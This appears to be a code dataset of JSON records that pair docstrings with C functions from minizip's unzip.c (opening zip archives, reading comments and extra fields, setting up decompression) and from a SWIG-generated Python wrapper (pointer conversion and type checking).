{"docstring": "/*\n  Open a Zip file. path contain the full pathname (by example,\n     on a Windows NT computer \"c:\\\\test\\\\zlib114.zip\" or on an Unix computer\n     \"zlib/zlib114.zip\".\n     If the zipfile cannot be opened (file doesn't exist or in not valid), the\n       return value is NULL.\n     Else, the return value is a unzFile Handle, usable with other function\n       of this unzip package.\n*/\n", "func_signal": "local unzFile unzOpenInternal (const void *path,\n                               zlib_filefunc64_32_def* pzlib_filefunc64_32_def,\n                               int is64bitOpenFunction)", "code": "{\n    unz64_s us;\n    unz64_s *s;\n    ZPOS64_T central_pos;\n    uLong   uL;\n\n    uLong number_disk;          /* number of the current dist, used for\n                                   spaning ZIP, unsupported, always 0*/\n    uLong number_disk_with_CD;  /* number the the disk with central dir, used\n                                   for spaning ZIP, unsupported, always 0*/\n    ZPOS64_T number_entry_CD;      /* total number of entries in\n                                   the central dir\n                                   (same than number_entry on nospan) */\n\n    int err=UNZ_OK;\n\n    if (unz_copyright[0]!=' ')\n        return NULL;\n\n    us.z_filefunc.zseek32_file = NULL;\n    us.z_filefunc.ztell32_file = NULL;\n    if (pzlib_filefunc64_32_def==NULL)\n        fill_fopen64_filefunc(&us.z_filefunc.zfile_func64);\n    else\n        us.z_filefunc = *pzlib_filefunc64_32_def;\n    us.is64bitOpenFunction = is64bitOpenFunction;\n\n\n\n    us.filestream = ZOPEN64(us.z_filefunc,\n                                                 path,\n                                                 ZLIB_FILEFUNC_MODE_READ |\n                                                 ZLIB_FILEFUNC_MODE_EXISTING);\n    if (us.filestream==NULL)\n        return NULL;\n\n    central_pos = unz64local_SearchCentralDir64(&us.z_filefunc,us.filestream);\n    if (central_pos)\n    {\n        uLong uS;\n        ZPOS64_T uL64;\n\n        us.isZip64 = 1;\n\n        if (ZSEEK64(us.z_filefunc, us.filestream,\n                                      central_pos,ZLIB_FILEFUNC_SEEK_SET)!=0)\n        err=UNZ_ERRNO;\n\n        /* the signature, already checked */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* size of zip64 end of central directory record */\n        if (unz64local_getLong64(&us.z_filefunc, us.filestream,&uL64)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* version made by */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&uS)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* version needed to extract */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&uS)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* number of this disk */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&number_disk)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* number of the disk with the start of the central directory */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&number_disk_with_CD)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* total number of entries in the central directory on this disk */\n        if (unz64local_getLong64(&us.z_filefunc, us.filestream,&us.gi.number_entry)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* total number of entries in the central directory */\n        if (unz64local_getLong64(&us.z_filefunc, us.filestream,&number_entry_CD)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        if ((number_entry_CD!=us.gi.number_entry) ||\n            (number_disk_with_CD!=0) ||\n            (number_disk!=0))\n            err=UNZ_BADZIPFILE;\n\n        /* size of the central directory */\n        if (unz64local_getLong64(&us.z_filefunc, us.filestream,&us.size_central_dir)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* offset of start of central directory with respect to the\n          starting disk number */\n        if (unz64local_getLong64(&us.z_filefunc, us.filestream,&us.offset_central_dir)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        us.gi.size_comment = 0;\n    }\n    else\n    {\n        central_pos = unz64local_SearchCentralDir(&us.z_filefunc,us.filestream);\n        if (central_pos==0)\n            err=UNZ_ERRNO;\n\n        us.isZip64 = 0;\n\n        if (ZSEEK64(us.z_filefunc, us.filestream,\n                                        central_pos,ZLIB_FILEFUNC_SEEK_SET)!=0)\n            err=UNZ_ERRNO;\n\n        /* the signature, already checked */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* number of this disk */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&number_disk)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* number of the disk with the start of the central directory */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&number_disk_with_CD)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* total number of entries in the central dir on this disk */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n        us.gi.number_entry = uL;\n\n        /* total number of entries in the central dir */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n        number_entry_CD = uL;\n\n        if ((number_entry_CD!=us.gi.number_entry) ||\n            (number_disk_with_CD!=0) ||\n            (number_disk!=0))\n            err=UNZ_BADZIPFILE;\n\n        /* size of the central directory */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n        us.size_central_dir = uL;\n\n        /* offset of start of central directory with respect to the\n            starting disk number */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n        us.offset_central_dir = uL;\n\n        /* zipfile comment length */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&us.gi.size_comment)!=UNZ_OK)\n            err=UNZ_ERRNO;\n    }\n\n    if ((central_pos<us.offset_central_dir+us.size_central_dir) &&\n        (err==UNZ_OK))\n        err=UNZ_BADZIPFILE;\n\n    if (err!=UNZ_OK)\n    {\n        ZCLOSE64(us.z_filefunc, us.filestream);\n        return NULL;\n    }\n\n    us.byte_before_the_zipfile = central_pos -\n                            (us.offset_central_dir+us.size_central_dir);\n    us.central_pos = central_pos;\n    us.pfile_in_zip_read = NULL;\n    us.encrypted = 0;\n\n\n    s=(unz64_s*)ALLOC(sizeof(unz64_s));\n    if( s != NULL)\n    {\n        *s=us;\n        unzGoToFirstFile((unzFile)s);\n    }\n    return (unzFile)s;\n}", "path": "novel-design\\SSZipArchive\\minizip\\unzip.c", "repo_name": "ltebean/novel-design", "stars": 335, "license": "None", "language": "c", "size": 3471}
{"docstring": "/*\n  Set the current file of the zipfile to the next file.\n  return UNZ_OK if there is no problem\n  return UNZ_END_OF_LIST_OF_FILE if the actual file was the latest.\n*/\n", "func_signal": "extern int ZEXPORT unzGoToNextFile (unzFile  file)", "code": "{\n    unz64_s* s;\n    int err;\n\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n        return UNZ_END_OF_LIST_OF_FILE;\n    if (s->gi.number_entry != 0xffff)    /* 2^16 files overflow hack */\n      if (s->num_file+1==s->gi.number_entry)\n        return UNZ_END_OF_LIST_OF_FILE;\n\n    s->pos_in_central_dir += SIZECENTRALDIRITEM + s->cur_file_info.size_filename +\n            s->cur_file_info.size_file_extra + s->cur_file_info.size_file_comment ;\n    s->num_file++;\n    err = unz64local_GetCurrentFileInfoInternal(file,&s->cur_file_info,\n                                               &s->cur_file_info_internal,\n                                               NULL,0,NULL,0,NULL,0);\n    s->current_file_ok = (err == UNZ_OK);\n    return err;\n}", "path": "novel-design\\SSZipArchive\\minizip\\unzip.c", "repo_name": "ltebean/novel-design", "stars": 335, "license": "None", "language": "c", "size": 3471}
{"docstring": "/*\n  Get the global comment string of the ZipFile, in the szComment buffer.\n  uSizeBuf is the size of the szComment buffer.\n  return the number of byte copied or an error code <0\n*/\n", "func_signal": "extern int ZEXPORT unzGetGlobalComment (unzFile file, char * szComment, uLong uSizeBuf)", "code": "{\n    unz64_s* s;\n    uLong uReadThis ;\n    if (file==NULL)\n        return (int)UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n\n    uReadThis = uSizeBuf;\n    if (uReadThis>s->gi.size_comment)\n        uReadThis = s->gi.size_comment;\n\n    if (ZSEEK64(s->z_filefunc,s->filestream,s->central_pos+22,ZLIB_FILEFUNC_SEEK_SET)!=0)\n        return UNZ_ERRNO;\n\n    if (uReadThis>0)\n    {\n      *szComment='\\0';\n      if (ZREAD64(s->z_filefunc,s->filestream,szComment,uReadThis)!=uReadThis)\n        return UNZ_ERRNO;\n    }\n\n    if ((szComment != NULL) && (uSizeBuf > s->gi.size_comment))\n        *(szComment+s->gi.size_comment)='\\0';\n    return (int)uReadThis;\n}", "path": "novel-design\\SSZipArchive\\minizip\\unzip.c", "repo_name": "ltebean/novel-design", "stars": 335, "license": "None", "language": "c", "size": 3471}
{"docstring": "/*\n  Open for reading data the current file in the zipfile.\n  If there is no error and the file is opened, the return value is UNZ_OK.\n*/\n", "func_signal": "extern int ZEXPORT unzOpenCurrentFile3 (unzFile file, int* method,\n                                            int* level, int raw, const char* password)", "code": "{\n    int err=UNZ_OK;\n    uInt iSizeVar;\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    ZPOS64_T offset_local_extrafield;  /* offset of the local extra field */\n    uInt  size_local_extrafield;    /* size of the local extra field */\n#    ifndef NOUNCRYPT\n    char source[12];\n#    else\n    if (password != NULL)\n        return UNZ_PARAMERROR;\n#    endif\n\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n        return UNZ_PARAMERROR;\n\n    if (s->pfile_in_zip_read != NULL)\n        unzCloseCurrentFile(file);\n\n    if (unz64local_CheckCurrentFileCoherencyHeader(s,&iSizeVar, &offset_local_extrafield,&size_local_extrafield)!=UNZ_OK)\n        return UNZ_BADZIPFILE;\n\n    pfile_in_zip_read_info = (file_in_zip64_read_info_s*)ALLOC(sizeof(file_in_zip64_read_info_s));\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_INTERNALERROR;\n\n    pfile_in_zip_read_info->read_buffer=(char*)ALLOC(UNZ_BUFSIZE);\n    pfile_in_zip_read_info->offset_local_extrafield = offset_local_extrafield;\n    pfile_in_zip_read_info->size_local_extrafield = size_local_extrafield;\n    pfile_in_zip_read_info->pos_local_extrafield=0;\n    pfile_in_zip_read_info->raw=raw;\n    pfile_in_zip_read_info->byte_before_the_zipfile = 0;\n\n    if (pfile_in_zip_read_info->read_buffer==NULL)\n    {\n        TRYFREE(pfile_in_zip_read_info);\n        return UNZ_INTERNALERROR;\n    }\n\n    pfile_in_zip_read_info->stream_initialised=0;\n\n    if (method!=NULL)\n        *method = (int)s->cur_file_info.compression_method;\n\n    if (level!=NULL)\n    {\n        *level = 6;\n        switch (s->cur_file_info.flag & 0x06)\n        {\n          case 6 : *level = 1; break;\n          case 4 : *level = 2; break;\n          case 2 : *level = 9; break;\n        }\n    }\n\n    if ((s->cur_file_info.compression_method!=0) &&\n/* #ifdef HAVE_BZIP2 */\n        (s->cur_file_info.compression_method!=Z_BZIP2ED) &&\n/* #endif */\n        (s->cur_file_info.compression_method!=Z_DEFLATED))\n\t{\n#ifndef __clang_analyzer__\n        err=UNZ_BADZIPFILE;\n#endif\n\t}\n\n    pfile_in_zip_read_info->crc32_wait=s->cur_file_info.crc;\n    pfile_in_zip_read_info->crc32=0;\n    pfile_in_zip_read_info->total_out_64=0;\n    pfile_in_zip_read_info->compression_method = s->cur_file_info.compression_method;\n    pfile_in_zip_read_info->filestream=s->filestream;\n    pfile_in_zip_read_info->z_filefunc=s->z_filefunc;\n#ifndef __clang_analyzer__\n    pfile_in_zip_read_info->byte_before_the_zipfile=s->byte_before_the_zipfile;\n#endif\n\n    pfile_in_zip_read_info->stream.total_out = 0;\n\n    if ((s->cur_file_info.compression_method==Z_BZIP2ED) && (!raw))\n    {\n#ifdef HAVE_BZIP2\n      pfile_in_zip_read_info->bstream.bzalloc = (void *(*) (void *, int, int))0;\n      pfile_in_zip_read_info->bstream.bzfree = (free_func)0;\n      pfile_in_zip_read_info->bstream.opaque = (voidpf)0;\n      pfile_in_zip_read_info->bstream.state = (voidpf)0;\n\n      pfile_in_zip_read_info->stream.zalloc = (alloc_func)0;\n      pfile_in_zip_read_info->stream.zfree = (free_func)0;\n      pfile_in_zip_read_info->stream.opaque = (voidpf)0;\n      pfile_in_zip_read_info->stream.next_in = (voidpf)0;\n      pfile_in_zip_read_info->stream.avail_in = 0;\n\n      err=BZ2_bzDecompressInit(&pfile_in_zip_read_info->bstream, 0, 0);\n      if (err == Z_OK)\n        pfile_in_zip_read_info->stream_initialised=Z_BZIP2ED;\n      else\n      {\n        TRYFREE(pfile_in_zip_read_info);\n        return err;\n      }\n#else\n      pfile_in_zip_read_info->raw=1;\n#endif\n    }\n    else if ((s->cur_file_info.compression_method==Z_DEFLATED) && (!raw))\n    {\n      pfile_in_zip_read_info->stream.zalloc = (alloc_func)0;\n      pfile_in_zip_read_info->stream.zfree = (free_func)0;\n      pfile_in_zip_read_info->stream.opaque = (voidpf)0;\n      pfile_in_zip_read_info->stream.next_in = 0;\n      pfile_in_zip_read_info->stream.avail_in = 0;\n\n      err=inflateInit2(&pfile_in_zip_read_info->stream, -MAX_WBITS);\n      if (err == Z_OK)\n        pfile_in_zip_read_info->stream_initialised=Z_DEFLATED;\n      else\n      {\n        TRYFREE(pfile_in_zip_read_info);\n        return err;\n      }\n        /* windowBits is passed < 0 to tell that there is no zlib header.\n         * Note that in this case inflate *requires* an extra \"dummy\" byte\n         * after the compressed stream in order to complete decompression and\n         * return Z_STREAM_END.\n         * In unzip, i don't wait absolutely Z_STREAM_END because I known the\n         * size of both compressed and uncompressed data\n         */\n    }\n    pfile_in_zip_read_info->rest_read_compressed =\n            s->cur_file_info.compressed_size ;\n    pfile_in_zip_read_info->rest_read_uncompressed =\n            s->cur_file_info.uncompressed_size ;\n\n\n    pfile_in_zip_read_info->pos_in_zipfile =\n            s->cur_file_info_internal.offset_curfile + SIZEZIPLOCALHEADER +\n              iSizeVar;\n\n    pfile_in_zip_read_info->stream.avail_in = (uInt)0;\n\n    s->pfile_in_zip_read = pfile_in_zip_read_info;\n                s->encrypted = 0;\n\n#    ifndef NOUNCRYPT\n    if (password != NULL)\n    {\n        int i;\n        s->pcrc_32_tab = (const unsigned long*)get_crc_table();\n        init_keys(password,s->keys,s->pcrc_32_tab);\n        if (ZSEEK64(s->z_filefunc, s->filestream,\n                  s->pfile_in_zip_read->pos_in_zipfile +\n                     s->pfile_in_zip_read->byte_before_the_zipfile,\n                  SEEK_SET)!=0)\n            return UNZ_INTERNALERROR;\n        if(ZREAD64(s->z_filefunc, s->filestream,source, 12)<12)\n            return UNZ_INTERNALERROR;\n\n        for (i = 0; i<12; i++)\n            zdecode(s->keys,s->pcrc_32_tab,source[i]);\n\n        s->pfile_in_zip_read->pos_in_zipfile+=12;\n        s->encrypted=1;\n    }\n#    endif\n\n\n    return UNZ_OK;\n}", "path": "novel-design\\SSZipArchive\\minizip\\unzip.c", "repo_name": "ltebean/novel-design", "stars": 335, "license": "None", "language": "c", "size": 3471}
{"docstring": "/*\nRead extra field from the current file (opened by unzOpenCurrentFile)\nThis is the local-header version of the extra field (sometimes, there is\nmore info in the local-header version than in the central-header)\n\n  if buf==NULL, it return the size of the local extra field that can be read\n\n  if buf!=NULL, len is the size of the buffer, the extra header is copied in\n    buf.\n  the return value is the number of bytes copied in buf, or (if <0)\n    the error code\n*/\n", "func_signal": "extern int ZEXPORT unzGetLocalExtrafield (unzFile file, voidp buf, unsigned len)", "code": "{\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    uInt read_now;\n    ZPOS64_T size_to_read;\n\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n    size_to_read = (pfile_in_zip_read_info->size_local_extrafield -\n                pfile_in_zip_read_info->pos_local_extrafield);\n\n    if (buf==NULL)\n        return (int)size_to_read;\n\n    if (len>size_to_read)\n        read_now = (uInt)size_to_read;\n    else\n        read_now = (uInt)len ;\n\n    if (read_now==0)\n        return 0;\n\n    if (ZSEEK64(pfile_in_zip_read_info->z_filefunc,\n              pfile_in_zip_read_info->filestream,\n              pfile_in_zip_read_info->offset_local_extrafield +\n              pfile_in_zip_read_info->pos_local_extrafield,\n              ZLIB_FILEFUNC_SEEK_SET)!=0)\n        return UNZ_ERRNO;\n\n    if (ZREAD64(pfile_in_zip_read_info->z_filefunc,\n              pfile_in_zip_read_info->filestream,\n              buf,read_now)!=read_now)\n        return UNZ_ERRNO;\n\n    return (int)read_now;\n}", "path": "novel-design\\SSZipArchive\\minizip\\unzip.c", "repo_name": "ltebean/novel-design", "stars": 335, "license": "None", "language": "c", "size": 3471}
{"docstring": "/* Convert a packed value value */\n", "func_signal": "SWIGRUNTIME int\nSWIG_Python_ConvertPacked(PyObject *obj, void *ptr, size_t sz, swig_type_info *ty)", "code": "{\n  swig_type_info *to = SwigPyPacked_UnpackData(obj, ptr, sz);\n  if (!to) return SWIG_ERROR;\n  if (ty) {\n    if (to != ty) {\n      /* check type cast? */\n      swig_cast_info *tc = SWIG_TypeCheck(to->name,ty);\n      if (!tc) return SWIG_ERROR;\n    }\n  }\n  return SWIG_OK;\n}", "path": "swig\\example_wrap.c", "repo_name": "tobegit3hub/miniflow", "stars": 301, "license": "apache-2.0", "language": "c", "size": 3557}
{"docstring": "/* Acquire a pointer value */\n", "func_signal": "SWIGRUNTIME int\nSWIG_Python_AcquirePtr(PyObject *obj, int own)", "code": "{\n  if (own == SWIG_POINTER_OWN) {\n    SwigPyObject *sobj = SWIG_Python_GetSwigThis(obj);\n    if (sobj) {\n      int oldown = sobj->own;\n      sobj->own = own;\n      return oldown;\n    }\n  }\n  return 0;\n}", "path": "swig\\example_wrap.c", "repo_name": "tobegit3hub/miniflow", "stars": 301, "license": "apache-2.0", "language": "c", "size": 3557}
{"docstring": "/* Unpack the argument tuple */\n", "func_signal": "SWIGINTERN Py_ssize_t\nSWIG_Python_UnpackTuple(PyObject *args, const char *name, Py_ssize_t min, Py_ssize_t max, PyObject **objs)", "code": "{\n  if (!args) {\n    if (!min && !max) {\n      return 1;\n    } else {\n      PyErr_Format(PyExc_TypeError, \"%s expected %s%d arguments, got none\", \n\t\t   name, (min == max ? \"\" : \"at least \"), (int)min);\n      return 0;\n    }\n  }  \n  if (!PyTuple_Check(args)) {\n    if (min <= 1 && max >= 1) {\n      Py_ssize_t i;\n      objs[0] = args;\n      for (i = 1; i < max; ++i) {\n\tobjs[i] = 0;\n      }\n      return 2;\n    }\n    PyErr_SetString(PyExc_SystemError, \"UnpackTuple() argument list is not a tuple\");\n    return 0;\n  } else {\n    Py_ssize_t l = PyTuple_GET_SIZE(args);\n    if (l < min) {\n      PyErr_Format(PyExc_TypeError, \"%s expected %s%d arguments, got %d\", \n\t\t   name, (min == max ? \"\" : \"at least \"), (int)min, (int)l);\n      return 0;\n    } else if (l > max) {\n      PyErr_Format(PyExc_TypeError, \"%s expected %s%d arguments, got %d\", \n\t\t   name, (min == max ? \"\" : \"at most \"), (int)max, (int)l);\n      return 0;\n    } else {\n      Py_ssize_t i;\n      for (i = 0; i < l; ++i) {\n\tobjs[i] = PyTuple_GET_ITEM(args, i);\n      }\n      for (; l < max; ++l) {\n\tobjs[l] = 0;\n      }\n      return i + 1;\n    }    \n  }\n}", "path": "swig\\example_wrap.c", "repo_name": "tobegit3hub/miniflow", "stars": 301, "license": "apache-2.0", "language": "c", "size": 3557}
{"docstring": "/*\n  Check type equivalence in a name list like <name1>|<name2>|...\n  Return 0 if equal, -1 if nb < tb, 1 if nb > tb\n*/\n", "func_signal": "SWIGRUNTIME int\nSWIG_TypeCmp(const char *nb, const char *tb)", "code": "{\n  int equiv = 1;\n  const char* te = tb + strlen(tb);\n  const char* ne = nb;\n  while (equiv != 0 && *ne) {\n    for (nb = ne; *ne; ++ne) {\n      if (*ne == '|') break;\n    }\n    equiv = SWIG_TypeNameComp(nb, ne, tb, te);\n    if (*ne) ++ne;\n  }\n  return equiv;\n}", "path": "swig\\example_wrap.c", "repo_name": "tobegit3hub/miniflow", "stars": 301, "license": "apache-2.0", "language": "c", "size": 3557}
{"docstring": "/* Convert a function ptr value */\n", "func_signal": "SWIGRUNTIME int\nSWIG_Python_ConvertFunctionPtr(PyObject *obj, void **ptr, swig_type_info *ty)", "code": "{\n  if (!PyCFunction_Check(obj)) {\n    return SWIG_ConvertPtr(obj, ptr, ty, 0);\n  } else {\n    void *vptr = 0;\n    \n    /* here we get the method pointer for callbacks */\n    const char *doc = (((PyCFunctionObject *)obj) -> m_ml -> ml_doc);\n    const char *desc = doc ? strstr(doc, \"swig_ptr: \") : 0;\n    if (desc)\n      desc = ty ? SWIG_UnpackVoidPtr(desc + 10, &vptr, ty->name) : 0;\n    if (!desc) \n      return SWIG_ERROR;\n    if (ty) {\n      swig_cast_info *tc = SWIG_TypeCheck(desc,ty);\n      if (tc) {\n        int newmemory = 0;\n        *ptr = SWIG_TypeCast(tc,vptr,&newmemory);\n        assert(!newmemory); /* newmemory handling not yet implemented */\n      } else {\n        return SWIG_ERROR;\n      }\n    } else {\n      *ptr = vptr;\n    }\n    return SWIG_OK;\n  }\n}", "path": "swig\\example_wrap.c", "repo_name": "tobegit3hub/miniflow", "stars": 301, "license": "apache-2.0", "language": "c", "size": 3557}
{"docstring": "/* Convert a pointer value */\n", "func_signal": "SWIGRUNTIME int\nSWIG_Python_ConvertPtrAndOwn(PyObject *obj, void **ptr, swig_type_info *ty, int flags, int *own)", "code": "{\n  int res;\n  SwigPyObject *sobj;\n  int implicit_conv = (flags & SWIG_POINTER_IMPLICIT_CONV) != 0;\n\n  if (!obj)\n    return SWIG_ERROR;\n  if (obj == Py_None && !implicit_conv) {\n    if (ptr)\n      *ptr = 0;\n    return SWIG_OK;\n  }\n\n  res = SWIG_ERROR;\n\n  sobj = SWIG_Python_GetSwigThis(obj);\n  if (own)\n    *own = 0;\n  while (sobj) {\n    void *vptr = sobj->ptr;\n    if (ty) {\n      swig_type_info *to = sobj->ty;\n      if (to == ty) {\n        /* no type cast needed */\n        if (ptr) *ptr = vptr;\n        break;\n      } else {\n        swig_cast_info *tc = SWIG_TypeCheck(to->name,ty);\n        if (!tc) {\n          sobj = (SwigPyObject *)sobj->next;\n        } else {\n          if (ptr) {\n            int newmemory = 0;\n            *ptr = SWIG_TypeCast(tc,vptr,&newmemory);\n            if (newmemory == SWIG_CAST_NEW_MEMORY) {\n              assert(own); /* badly formed typemap which will lead to a memory leak - it must set and use own to delete *ptr */\n              if (own)\n                *own = *own | SWIG_CAST_NEW_MEMORY;\n            }\n          }\n          break;\n        }\n      }\n    } else {\n      if (ptr) *ptr = vptr;\n      break;\n    }\n  }\n  if (sobj) {\n    if (own)\n      *own = *own | sobj->own;\n    if (flags & SWIG_POINTER_DISOWN) {\n      sobj->own = 0;\n    }\n    res = SWIG_OK;\n  } else {\n    if (implicit_conv) {\n      SwigPyClientData *data = ty ? (SwigPyClientData *) ty->clientdata : 0;\n      if (data && !data->implicitconv) {\n        PyObject *klass = data->klass;\n        if (klass) {\n          PyObject *impconv;\n          data->implicitconv = 1; /* avoid recursion and call 'explicit' constructors*/\n          impconv = SWIG_Python_CallFunctor(klass, obj);\n          data->implicitconv = 0;\n          if (PyErr_Occurred()) {\n            PyErr_Clear();\n            impconv = 0;\n          }\n          if (impconv) {\n            SwigPyObject *iobj = SWIG_Python_GetSwigThis(impconv);\n            if (iobj) {\n              void *vptr;\n              res = SWIG_Python_ConvertPtrAndOwn((PyObject*)iobj, &vptr, ty, 0, 0);\n              if (SWIG_IsOK(res)) {\n                if (ptr) {\n                  *ptr = vptr;\n                  /* transfer the ownership to 'ptr' */\n                  iobj->own = 0;\n                  res = SWIG_AddCast(res);\n                  res = SWIG_AddNewMask(res);\n                } else {\n                  res = SWIG_AddCast(res);\t\t    \n                }\n              }\n            }\n            Py_DECREF(impconv);\n          }\n        }\n      }\n    }\n    if (!SWIG_IsOK(res) && obj == Py_None) {\n      if (ptr)\n        *ptr = 0;\n      if (PyErr_Occurred())\n        PyErr_Clear();\n      res = SWIG_OK;\n    }\n  }\n  return res;\n}", "path": "swig\\example_wrap.c", "repo_name": "tobegit3hub/miniflow", "stars": 301, "license": "apache-2.0", "language": "c", "size": 3557}
{"docstring": "/* Create a new pointer object */\n", "func_signal": "SWIGRUNTIME PyObject *\nSWIG_Python_NewPointerObj(PyObject *self, void *ptr, swig_type_info *type, int flags)", "code": "{\n  SwigPyClientData *clientdata;\n  PyObject * robj;\n  int own;\n\n  if (!ptr)\n    return SWIG_Py_Void();\n\n  clientdata = type ? (SwigPyClientData *)(type->clientdata) : 0;\n  own = (flags & SWIG_POINTER_OWN) ? SWIG_POINTER_OWN : 0;\n  if (clientdata && clientdata->pytype) {\n    SwigPyObject *newobj;\n    if (flags & SWIG_BUILTIN_TP_INIT) {\n      newobj = (SwigPyObject*) self;\n      if (newobj->ptr) {\n        PyObject *next_self = clientdata->pytype->tp_alloc(clientdata->pytype, 0);\n        while (newobj->next)\n\t  newobj = (SwigPyObject *) newobj->next;\n        newobj->next = next_self;\n        newobj = (SwigPyObject *)next_self;\n#ifdef SWIGPYTHON_BUILTIN\n        newobj->dict = 0;\n#endif\n      }\n    } else {\n      newobj = PyObject_New(SwigPyObject, clientdata->pytype);\n#ifdef SWIGPYTHON_BUILTIN\n      newobj->dict = 0;\n#endif\n    }\n    if (newobj) {\n      newobj->ptr = ptr;\n      newobj->ty = type;\n      newobj->own = own;\n      newobj->next = 0;\n      return (PyObject*) newobj;\n    }\n    return SWIG_Py_Void();\n  }\n\n  assert(!(flags & SWIG_BUILTIN_TP_INIT));\n\n  robj = SwigPyObject_New(ptr, type, own);\n  if (robj && clientdata && !(flags & SWIG_POINTER_NOSHADOW)) {\n    PyObject *inst = SWIG_Python_NewShadowInstance(clientdata, robj);\n    Py_DECREF(robj);\n    robj = inst;\n  }\n  return robj;\n}", "path": "swig\\example_wrap.c", "repo_name": "tobegit3hub/miniflow", "stars": 301, "license": "apache-2.0", "language": "c", "size": 3557}
{"docstring": "/*\n   Pack 'void *' into a string buffer.\n*/\n", "func_signal": "SWIGRUNTIME char *\nSWIG_PackVoidPtr(char *buff, void *ptr, const char *name, size_t bsz)", "code": "{\n  char *r = buff;\n  if ((2*sizeof(void *) + 2) > bsz) return 0;\n  *(r++) = '_';\n  r = SWIG_PackData(r,&ptr,sizeof(void *));\n  if (strlen(name) + 1 > (bsz - (r - buff))) return 0;\n  strcpy(r,name);\n  return buff;\n}", "path": "swig\\example_wrap.c", "repo_name": "tobegit3hub/miniflow", "stars": 301, "license": "apache-2.0", "language": "c", "size": 3557}
{"docstring": "/* The python cached type query */\n", "func_signal": "SWIGRUNTIME PyObject *\nSWIG_Python_TypeCache(void)", "code": "{\n  static PyObject *SWIG_STATIC_POINTER(cache) = PyDict_New();\n  return cache;\n}", "path": "swig\\example_wrap.c", "repo_name": "tobegit3hub/miniflow", "stars": 301, "license": "apache-2.0", "language": "c", "size": 3557}
{"docstring": "/*\n  Identical to SWIG_TypeCheck, except strcmp is replaced with a pointer comparison\n*/\n", "func_signal": "SWIGRUNTIME swig_cast_info *\nSWIG_TypeCheckStruct(swig_type_info *from, swig_type_info *ty)", "code": "{\n  if (ty) {\n    swig_cast_info *iter = ty->cast;\n    while (iter) {\n      if (iter->type == from) {\n        if (iter == ty->cast)\n          return iter;\n        /* Move iter to the top of the linked list */\n        iter->prev->next = iter->next;\n        if (iter->next)\n          iter->next->prev = iter->prev;\n        iter->next = ty->cast;\n        iter->prev = 0;\n        if (ty->cast) ty->cast->prev = iter;\n        ty->cast = iter;\n        return iter;\n      }\n      iter = iter->next;\n    }\n  }\n  return 0;\n}", "path": "swig\\example_wrap.c", "repo_name": "tobegit3hub/miniflow", "stars": 301, "license": "apache-2.0", "language": "c", "size": 3557}
{"docstring": "/* Convert a pointer value, signal an exception on a type mismatch */\n", "func_signal": "SWIGRUNTIME void *\nSWIG_Python_MustGetPtr(PyObject *obj, swig_type_info *ty, int SWIGUNUSEDPARM(argnum), int flags)", "code": "{\n  void *result;\n  if (SWIG_Python_ConvertPtr(obj, &result, ty, flags) == -1) {\n    PyErr_Clear();\n#if SWIG_POINTER_EXCEPTION\n    if (flags) {\n      SWIG_Python_TypeError(SWIG_TypePrettyName(ty), obj);\n      SWIG_Python_ArgFail(argnum);\n    }\n#endif\n  }\n  return result;\n}", "path": "swig\\example_wrap.c", "repo_name": "tobegit3hub/miniflow", "stars": 301, "license": "apache-2.0", "language": "c", "size": 3557}
{"docstring": "/*\n  Compare two type names skipping the space characters, therefore\n  \"char*\" == \"char *\" and \"Class<int>\" == \"Class<int >\", etc.\n\n  Return 0 when the two name types are equivalent, as in\n  strncmp, but skipping ' '.\n*/\n", "func_signal": "SWIGRUNTIME int\nSWIG_TypeNameComp(const char *f1, const char *l1,\n\t\t  const char *f2, const char *l2)", "code": "{\n  for (;(f1 != l1) && (f2 != l2); ++f1, ++f2) {\n    while ((*f1 == ' ') && (f1 != l1)) ++f1;\n    while ((*f2 == ' ') && (f2 != l2)) ++f2;\n    if (*f1 != *f2) return (*f1 > *f2) ? 1 : -1;\n  }\n  return (int)((l1 - f1) - (l2 - f2));\n}", "path": "swig\\example_wrap.c", "repo_name": "tobegit3hub/miniflow", "stars": 301, "license": "apache-2.0", "language": "c", "size": 3557}
